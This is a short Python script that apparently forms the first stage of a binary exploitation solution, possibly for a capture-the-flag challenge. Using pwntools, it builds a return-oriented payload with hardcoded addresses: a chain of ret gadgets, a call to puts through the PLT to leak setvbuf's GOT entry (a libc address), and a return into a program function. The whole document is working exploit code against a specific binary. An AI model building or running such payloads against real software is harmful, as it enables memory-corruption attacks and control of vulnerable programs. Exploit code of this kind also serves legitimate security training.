from pwn import *
nopret = 0x080490af
setvbuf_GOT = 0x0804c014
puts_plt = 0x08049030
popret = 0x0804901e
funcret = 0x8049070
payload1 = p32(nopret)*20+p32(puts_plt)+p32(popret)+p32(setvbuf_GOT)+p32(funcret)+p32(nopret)*3
print(payload1)
